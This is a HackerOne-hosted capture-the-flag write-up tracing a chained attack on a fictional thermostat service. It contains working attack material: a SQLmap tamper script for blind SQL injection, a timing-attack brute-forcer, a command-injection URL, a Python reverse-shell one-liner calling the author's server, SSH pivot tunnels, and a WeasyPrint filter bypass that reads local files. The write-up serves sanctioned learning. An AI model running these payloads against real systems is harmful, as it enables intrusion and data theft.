{"id":514415,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTQ0MTU=","url":"https://hackerone.com/reports/514415","title":"0xc0ffee's 50M-CTF Submission","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-03-24T06:09:50.720Z","submitted_at":"2019-03-24T06:09:50.720Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xc0ffee","url":"/0xc0ffee","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/24JiPXncr9eTUiXEAJmP2w4S/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:57:12.592Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:57:07.745Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Introduction\n\nThis CTF was extremely fun and truly original. It covered different kinds of very interesting challenges where completing one challenge led to another one, like some sort of quest with various levels.\n\nThank you [Cody](https://twitter.com/daeken) and [HackerOne](https://hackerone.com) for giving 5 hackers the opportunity to go to Vegas, test their skills, and most of all, learn!\n\n## Stage 1 - It all started with a picture\n\nHackerOne [announced](https://twitter.com/Hacker0x01/status/1100543680383832065) the CTF so I downloaded the two pictures from that tweet and started inspecting them for clues or flags. I began by simply looking at the pictures for interesting patterns, codes or anything obvious, then proceeded to using zSteg on the picture with the H1 flag:\n\n```bash\nzsteg -a image_with_binary_and_flag.png | grep h1\n\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\n```\n\nThe https://bit.do/h1therm URL was hiding in the `zlib` data.\n\n\n## Stage 2 - Secrets\n\nVisiting the URL would redirect to a Google Drive share hosting an APK file: `h1thermostat.apk`. I loaded the HackerOne Thermostat application in Android Studio's device emulator to get a feel of the features then decompiled it using JADX.\n\nWhen I began inspecting the Java code, I noticed the URL http://35.243.186.41 in the `PayloadRequest()` method:\n\n```java\npublic PayloadRequest(JSONObject jSONObject, final Listener\u003cString\u003e listener) throws Exception {\n  super(1, \"http://35.243.186.41/\", new ErrorListener() {\n      public void onErrorResponse(VolleyError volleyError) {\n          listener.onResponse(\"Connection failed\");\n        }\n    });\n    this.mListener = listener;\n    this.mParams.put(\"d\", buildPayload(jSONObject));\n}\n```\nThis led me to believe that the application had some sort of interaction with that URL by sending JSON objects in the `d` parameter.\n\nSending a GET request to the URL returned a `405 Method Not Allowed` response. The application would only accept POST requests and the response was always different, had the same length and was always base64 encoded:\n\n```bash\ncurl -X \"POST\" http://35.243.186.41/ -d \"h1-702\"\n\n4Y72K2/1OSU3Le8MgMK5SyB/TqwuRWrfo36ZejjELd2BSbvM8ffNnM1jz9inlyN4\n```\nSince base64 decoding the response always returned an encrypted string, I moved back to source code analysis. There clearly appeared to be encryption going on in the `parseNetworkResponse()` method. In fact, the requests sent from the server and the mobile application used AES encryption with CBC mode and PKCS5 padding:\n\n```java\nprotected Response\u003cString\u003e parseNetworkResponse(NetworkResponse networkResponse) {\n       try {\n           Object decode = Base64.decode(new String(networkResponse.data), 0);\n           Object obj = new byte[16];\n           System.arraycopy(decode, 0, obj, 0, 16);\n           Object obj2 = new byte[(decode.length - 16)];\n           System.arraycopy(decode, 16, obj2, 0, decode.length - 16);\n           Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n           AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec(obj);\n           Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n           instance.init(2, secretKeySpec, ivParameterSpec);\n           JSONObject jSONObject = new JSONObject(new String(instance.doFinal(obj2)));\n           if (jSONObject.getBoolean(\"success\")) {\n               return Response.success(null, getCacheEntry());\n           }\n           return Response.success(jSONObject.getString(\"error\"), getCacheEntry());\n       } catch (Exception unused) {\n           return Response.success(\"Unknown\", getCacheEntry());\n       }\n}\n\n```\n\nLooking carefully at the code, I noticed that in order for the request to be valid, the initialization vector (IV) had to be prepended to the encrypted request.\n\nBut wait, there's more! The code was leaking the secret key:\n\n```java\nKey secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n```\n\nAnd while it is not much of a secret, the IV was 16 bytes:\n\n```java\nObject obj = new byte[16];\n```\n\nThe `LoginActivity` class contained the remaining code required to understand the application's logic. Looking at its `attemptLogin()` method, it was clear that I needed to send the server a JSON object:\n\n```java\n...\njSONObject.put(\"username\", username);\njSONObject.put(\"password\", password);\njSONObject.put(\"cmd\", \"getTemp\");\n...\n```\n\nI quickly wrote a Python script to encrypt a JSON object using the secret key obtained from the mobile application:\n\n```python\nfrom Crypto.Cipher import AES\nimport base64\nimport requests\n\nblocksize = 16\npkcs5Pad = lambda s: s + (blocksize - len(s) % blocksize) * chr(blocksize - len(s) % blocksize)\npkcs5Unpad = lambda s : s[0:-ord(s[-1])]\n\nclass EncryptionH1:\n\n    def __init__(self):\n        ENCRYPTION_KEY = [56,79,46,106,26,5,-27,34,59,-128,-23,96,-96,-90,80,116]\n        ENCRYPTION_KEY = ''.join(map(lambda x: chr(x % 256), ENCRYPTION_KEY))\n        self.cryptKey = ENCRYPTION_KEY\n        self.ivkey = \"b\"*16\n\n    def encrypt(self, string):\n        string = pkcs5Pad(string)\n        cipher = AES.new(self.cryptKey, AES.MODE_CBC, self.ivkey)\n        return base64.b64encode(self.ivkey+cipher.encrypt(string))\n\n    def decrypt(self, string):\n        string = base64.b64decode(string)\n\tcipher = AES.new(self.cryptKey, AES.MODE_CBC, self.ivkey)\n\n        return pkcs5Unpad(cipher.decrypt( string))\n\nif __name__== \"__main__\":\n    a = EncryptionH1()\n    encrypt = a.encrypt(r'''{\"username\":\"admin\",\"password\":\"test\",\"cmd\":\"getTemp\"}''')\n    print \"%s\" % encrypt\n    r = requests.post(\"http://35.243.186.41\",data={'d':encrypt})\n    decrypt = a.decrypt(r.text)\n    print \"%s\" % decrypt\n```\n\nThe Python script encrypts a JSON object, prepends the IV to the encrypted string and base64 encodes the final string. \n\nAfter a few login attempts with various passwords, I obtained access to the application with the `admin:password` credentials and received the following response:\n\n```json\n{\"temperature\": 73, \"success\": true}\n```\n\n## Stage 3 - Exfiltration\n\nAfter authenticating successfully and testing the `getTemp` and `setTemp` commands, I realized that I was probably in a rabbit hole, so I stepped back to test the login function.\n\nThe application returned an error when a single quote was injected in the value of the `username` field:\n\n```json\n{\"username\":\"'\",\"password\":\"password\",\"cmd\":\"getTemp\"}\n```\n\nHowever, with two single quotes, no errors were returned. The payload `' OR sleep(10)-- ` was then injected and a 10 second delay occurred. A couple of tests later, I concluded that I was dealing with a time-based blind SQL injection. \n\nIn order to speed things up, I wanted to automate the attack to see what was hiding in the database. To do so, I wrote a SQLmap tamper script that would encrypt and encode the SQLi payloads:\n\n```python\nimport base64\nfrom Crypto.Cipher import AES\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef encrypt(text):\n    blocksize = 16\n    pkcs5Pad = lambda s: s + (blocksize - len(s) % blocksize) * chr(blocksize - len(s) % blocksize)\n    text = pkcs5Pad(text)\n    ENCRYPTION_KEY = [56,79,46,106,26,5,-27,34,59,-128,-23,96,-96,-90,80,116]\n    ENCRYPTION_KEY = ''.join(map(lambda x: chr(x % 256), ENCRYPTION_KEY))\n    iv = 'b'*16\n    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)\n    return base64.b64encode(iv+cipher.encrypt(text))\n\ndef tamper(payload, **kwargs):\n    return encrypt(r'''{\"username\":\"%s\",\"password\":\"\",\"cmd\":\"getTemp\"}''' % payload)\n```\nI executed SQLmap and left it running as there was a lot of content to exfiltrate:\n\n```bash\nsqlmap -r sql.txt --tamper=./tamper_script.py --dump --technique=T\n```\n\nThe `sql.txt` file contained the request needed to be processed by SQLmap:\n\n```\nPOST / HTTP/1.1\nHost: 35.243.186.41\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\nd=*\n```\n\n{F450899}\n\n\nIn the database dump, there was a database named `flitebackend` with the `devices` and `users` tables. \n\n- The `users` table contained the username and hashed password of the user that I previously discovered. \n\n- The `devices` table contained 150 entries with IP addresses.\n\nI created a list with those IPs and used Nmap to scan them:\n\n```\nnmap -iL list.txt -T4\n```\n`104.196.12.98` was up and port 80 was open!\n\n## Stage 4 - Time is precious\n\nThere was a login page on http://104.196.12.98 which got me stuck for quite some time.\n\nThe `login.js` script was generating a 64 byte hash of the username and password when sending a login request:\n\n```html\nPOST / HTTP/1.1\nHost: 35.243.186.41\nContent-Type: application/x-www-form-urlencoded\n\nhash=e8765a4952a4f5d74b43e35d8fed6a0221c6877fba60a251aabde752f5ed13d8\n```\n\nAuthentication requests with the username `admin` and `f` or `h` as the password were taking quite longer to process than other login attempts. I also noticed that login attempts with the `admin:f` and `admin:h` credentials were both generating a hash starting with the `f9` characters.\n\nSince some login attempts were taking more time than others to process, I was pretty sure I was dealing with a **timing attack**.\n\nA few hours down the road, I realized that there were a few requirements for this attack to work:\n\n- The hash had to be 64 bytes\n\n- The hash had to contain a specific set of alphanumeric characters =\u003e `[a-f0-9]`\n\n- The brute-force had to be executed for every 2 bytes. So, in order to notice a time increase, we need to find the next 2 correct bytes, and so on until we find the right 64 byte hash.\n\nA quick Python script did the trick:\n\n```python\nimport requests\n\nwith open (\"list.txt\",\"r\") as file:\n  for line in file:\n    data = {\"hash\":\"f9\"+line.rstrip()+\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}\n    r = requests.post(\"http://104.196.12.98\",data).elapsed.total_seconds()\n    print \"Time taken: \"+str(r)+\" for \"+line.rstrip()\nfile.close()\n```\n\nThe `list.txt` file used by the script contained a pre-generated list of all the 2 byte combinations of `[a-f0-9]`. On a few occasions, there was some network latency that was causing inconsistencies in the responses and would've led me to false positives. For that particular reason, I decided to run the attack in a semi-automated fashion - the script allowed me to manually inspect if the time variation was legitimate before jumping to the next 2 bytes.\n\nIf a request took an extra 500-515 milliseconds to return the response, then I knew which 2 valid characters were next in the hash:\n\n```\nTime taken: 3.018276 for a0\nTime taken: 3.022713 for a1\nTime taken: 3.018442 for a2\nTime taken: 3.018941 for a3\nTime taken: 3.517988 for a4      =\u003e a4 took an extra 500ms\nTime taken: 3.018825 for a5\n```\nAfter a little while, I obtained the valid hash to login successfully:\n\n`f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`\n\n{F450897}\n\n## Stage 5 - Interesting Parameters\n\nThe **FliteThermostat Admin** portal presented two functionalities: **Temperature control** and **Check for updates**.\n\nLooking at the source code of the admin page, there was a commented out reference to `/diagnostics`. When I visited the endpoint, a `403 Forbidden` error was always returned, which kept me very busy trying to bypass it.\n\nHowever, the **Check for updates** feature on the `/update` endpoint caught my attention:\n\n```\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nI instantly thought of an SSRF attack since it looked like the server was trying to connect to `update.flitethermostat` on port 5000 and the time taken for the request to complete was around 3 seconds. \n\nI quickly identified the `port` parameter and was able to control the port the server was possibly trying to reach:\n\n`GET /update?port=xxx`\n\nBut I also wanted to control the host as all the requests seemed like they were sent to `update.flitethermostat`. So, I tried to connect the dots:\n\n- I was on `/update` and had control over the `port` parameter.\n\n- I had to find a parameter that would control the host the server was possibly connecting to.\n\nThat's when I started thinking of new parameters. I made a list of words like `update`, `host`, `hostname`, `set`, `get` and combined them with characters like `-` and `_`. Using the list of combined words, I found the `update_host` parameter.\n\nHowever, it didn't seem like the `update_host` parameter did much in terms of having control over the host. In fact, there was no sign of SSRF or XSPA when pointing it to localhost or to my VPS.\n\nLater on, I determined that there was no input sanitization and that the input was actually used in an unsafe way by the server which led to command injection:\n\n`GET /update?port=22\u0026update_host=localhost%26%26echo%20$(id)` =\u003e `localhost\u0026\u0026echo $(id)`\n\n```\nConnecting to http://localhost and downloading update manifest\n...\n...\n...\nCould not connect\nuid=0(root) gid=0(root) groups=0(root):22/\n```\nGetting a shell on the server was possible with a Python reverse shell one-liner:\n\n```bash\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"MY_VPS\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n## Stage 6 - Tunnels\n\nI was root on `172.28.0.2` and thought the CTF was over. However, I wanted to do a bit of recon on this box, so I used Nmap to scan the internal network and this is when the `172.28.0.3` host was discovered:\n\n```bash\nnmap -sn 172.28.0.0/24 -T4\n```\n\nI quickly set up a multi-hop SSH tunnel in order to communicate with `172.28.0.3:80` and to proxy the traffic with Burp Suite.\n\nOn my local machine:\n\n```bash\nssh -L 8888:127.0.0.1:8444 50mctf@MY_VPS\n```\nOn the `172.28.0.2` machine: \n\n```bash\nssh -v -o PubkeyAuthentication=no -o PreferredAuthentications=password -o GatewayPorts=yes -fN -R *:8444:172.28.0.3:80 50mctf@MY_VPS\n```\nBrowsing to `localhost:8888` successfully displayed the web application hosted on `172.28.0.3:80`:\n\n{F450898}\n\n## Stage 7 - Conversion\n\nBy inspecting the source code of the homepage, there was a commented out reference to `/invoices/new`.\nThat endpoint hosted a functionality that allowed unauthenticated users to generate HTML invoices and convert them to PDF files.\n\nThe request to generate an HTML invoice looked like this:\n\n`GET /invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D`\n\nURL decoded:\n```json\n{\"companyName\":\"Acme Tools\",\"email\":\"accounting@acme.com\",\"invoiceNumber\":\"0001\",\"date\":\"2019-04-01\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"background-color\":\"white\"}}}\n```\n\nThe request to generate a PDF file from the HTML was the same and only the endpoint was different:\n\n`GET /invoices/pdfize?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D`\n\nI edited the `styles` JSON array to reference an external image with the `background-image` CSS property and successfully received an HTTP request coming from the server that was trying to fetch the image during the HTML to PDF conversion:\n\n```\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n104.196.12.98 - - [17/Mar/2019 18:52:30] \"GET / HTTP/1.1\" 200 -\n```\n\nSo, based on the user-agent, [WeasyPrint's](https://weasyprint.org/) rendering engine was used to convert HTML code to PDF files. It was also possible, with this CSS injection, to load local images hosted on the server by using the `file:///` scheme:\n\n`file:///usr/share/pixmaps/debian-logo.png`\n\n## Stage 8 - Filters, filters and more filters\n\nAt this point, I wanted to inject iframe, object or embed attributes to load sensitive local files since the rendering was made server-side but all attempts were filtered by the application.\n\nI remembered a [blog post](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) where [Ziot](https://twitter.com/bbuerhaus) and [NahamSec](https://twitter.com/NahamSec) were able to bypass an XSS filter in a JSON object by prepending their payload with a semi-colon.\n\nI used that idea to successfully inject `\u003c` and `\u003e` in the `styles` JSON array:\n\n```json\n{\"companyName\":\"test\",\"email\":\"test@test.com\",\"invoiceNumber\":\"001\",\"date\":\"\",\"items\":[[\"1\",\"s\",\"s\",\"10\"]],\"email\":\"\",\"styles\":{\"test\":{\";\u003c\u003e\":\"\"}}}\n```\n\nI could inject `\u003c` and `\u003e` but I had to close out the `\u003cstyle\u003e` attribute before injecting other attributes. However, even though the filter was bypassed, a second filter was stripping out the following sequence:\n\n`\u003c/anything_here\u003e`\n\nA little bypass was required to fool the filter:\n\n`;\u003c\\/\u003c/s\u003estyle\u003e`\n\nThe `\u003c/s\u003e` was stripped out and `\u003c/` was joined with `style\u003e` to finally get `\u003c/style\u003e`:\n\n```html\n  \u003cstyle\u003e\n    ...\n    test {\n      : \u003c/style\u003e;\n    }\n    ...\n```\n\n## Stage 9 - Success!\n\nDespite the fact that I was able to inject `iframe`,`embed` and `object` attributes, they were unfortunately not displaying the contents of internal files after the conversion.\n\nAfter reading the [WeasyPrint documentation](https://weasyprint.readthedocs.io/en/stable/index.html) and its source code on GitHub, I realized that it was also possible to include [attachments](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link) in PDF files and that WeasyPrint could process them:\n\nSnippet of WeasyPrint's [html.py](https://github.com/Kozea/WeasyPrint/blob/master/weasyprint/html.py#L318):\n```python\nreturn dict(title=title, description=description, \n            generator=generator,keywords=keywords, \n            authors=authors,created=created,\n            modified=modified,attachments=attachments)\n```\n\nI remembered that the **FliteThermostat Admin** application's files were located under the `/app/` directory. Following the same logic, I tried to extract the `/app/main.py` file from this host:\n\n`GET /invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22s%22%2C%22s%22%2C%2210%22%5D%5D%2C%22email%22%3A%22%22%2C%22styles%22%3A%7B%22test%22%3A%7B%22%3B%3C%5C%2F%3C%2Fs%3Estyle%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A%2F%2F%2Fapp%2Fmain.py%5C%22%2F%3E%22%3A%22%22%7D%7D%7D`\n\nURL decoded:\n\n```json\n{\"companyName\":\"\",\"email\":\"\",\"invoiceNumber\":\"\",\"date\":\"\",\"items\":[[\"1\",\"s\",\"s\",\"10\"]],\"email\":\"\",\"styles\":{\"test\":{\";\u003c\\/\u003c/s\u003estyle\u003e\u003clink rel=attachment href=\\\"file:///app/main.py\\\"/\u003e\":\"\"}}}\n```\n\nThe PDF's size in the response was larger! I downloaded the PDF and extracted the attachment with binwalk:\n\n```bash\nbinwalk -e document.pdf\n```\n\nOne of the extracted files contained the `main.py` script announcing the end of the road for the CTF with the winning string! `c8889970d9fb722066f31e804e351993`\n\n{F450900}\n\n## Impact\n\nThanks for reading! :)","vulnerability_information_html":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eThis CTF was extremely fun and truly original. It covered different kinds of very interesting challenges where completing one challenge led to another one, like some sort of quest with various levels.\u003c/p\u003e\n\n\u003cp\u003eThank you \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fdaeken\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCody\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"https://hackerone.com\"\u003eHackerOne\u003c/a\u003e for giving 5 hackers the opportunity to go to Vegas, test their skills, and most of all, learn!\u003c/p\u003e\n\n\u003ch2 id=\"stage-1-it-all-started-with-a-picture\"\u003eStage 1 - It all started with a picture\u003c/h2\u003e\n\n\u003cp\u003eHackerOne \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1100543680383832065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eannounced\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the CTF so I downloaded the two pictures from that tweet and started inspecting them for clues or flags. I began by simply looking at the pictures for interesting patterns, codes or anything obvious, then proceeded to using zSteg on the picture with the H1 flag:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ezsteg \u003cspan class=\"nt\"\u003e-a\u003c/span\u003e image_with_binary_and_flag.png | \u003cspan class=\"nb\"\u003egrep \u003c/span\u003eh1\n\nb1,rgb,lsb,yx       .. zlib: \u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https://bit.do/h1therm\u0026quot;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e5, \u003cspan class=\"nv\"\u003esize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e22\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ca title=\"https://bit.do/h1therm\" href=\"/redirect?url=https%3A%2F%2Fbit.do%2Fh1therm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bit.do/h1therm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URL was hiding in the \u003ccode\u003ezlib\u003c/code\u003e data.\u003c/p\u003e\n\n\u003ch2 id=\"stage-2-secrets\"\u003eStage 2 - Secrets\u003c/h2\u003e\n\n\u003cp\u003eVisiting the URL would redirect to a Google Drive share hosting an APK file: \u003ccode\u003eh1thermostat.apk\u003c/code\u003e. I loaded the HackerOne Thermostat application in Android Studio\u0026#39;s device emulator to get a feel of the features then decompiled it using JADX.\u003c/p\u003e\n\n\u003cp\u003eWhen I began inspecting the Java code, I noticed the URL \u003ca title=\"http://35.243.186.41\" href=\"/redirect?url=http%3A%2F%2F35.243.186.41\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://35.243.186.41\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in the \u003ccode\u003ePayloadRequest()\u003c/code\u003e method:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"nf\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eErrorListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonErrorResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eVolleyError\u003c/span\u003e \u003cspan class=\"n\"\u003evolleyError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Connection failed\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emListener\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis led me to believe that the application had some sort of interaction with that URL by sending JSON objects in the \u003ccode\u003ed\u003c/code\u003e parameter.\u003c/p\u003e\n\n\u003cp\u003eSending a GET request to the URL returned a \u003ccode\u003e405 Method Not Allowed\u003c/code\u003e response. The application would only accept POST requests and the response was always different, had the same length and was always base64 encoded:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"nt\"\u003e-X\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e http://35.243.186.41/ \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;h1-702\u0026quot;\u003c/span\u003e\n\n4Y72K2/1OSU3Le8MgMK5SyB/TqwuRWrfo36ZejjELd2BSbvM8ffNnM1jz9inlyN4\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince base64 decoding the response always returned an encrypted string, I moved back to source code analysis. There clearly appeared to be encryption going on in the \u003ccode\u003eparseNetworkResponse()\u003c/code\u003e method. In fact, the requests sent from the server and the mobile application used AES encryption with CBC mode and PKCS5 padding:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nf\"\u003eparseNetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eNetworkResponse\u003c/span\u003e \u003cspan class=\"n\"\u003enetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan 